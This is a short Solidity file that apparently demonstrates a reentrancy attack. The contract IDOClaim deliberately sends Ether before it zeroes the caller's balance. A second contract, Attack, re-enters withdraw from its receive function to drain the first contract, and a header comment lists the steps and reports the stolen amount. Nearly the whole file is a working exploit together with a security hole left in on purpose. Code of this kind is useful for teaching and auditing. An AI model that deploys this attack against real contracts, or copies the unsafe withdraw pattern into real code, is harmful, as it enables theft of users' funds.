// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;

/*
steps:
+ EtherStore:
- deposit 5 ether 
+ Attack:
- call attack with 1 ether value 

result:
Attack got 6 ether

*/
contract IDOClaim {
    mapping(address => uint) public balances;
    
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    mapping(address => uint) public balances;
    
    IDOClaim public idoContract;
    constructor(address _idoContract) {
        idoContract = IDOClaim(_idoContract);
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    event ReceiveEvent(address from, uint value);
    
    receive() external payable {
        if (address(idoContract).balance >= 1 ether) {
            emit ReceiveEvent(msg.sender, msg.value);
            idoContract.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        idoContract.deposit{value: (1 ether)}();
        idoContract.withdraw();
    }

}
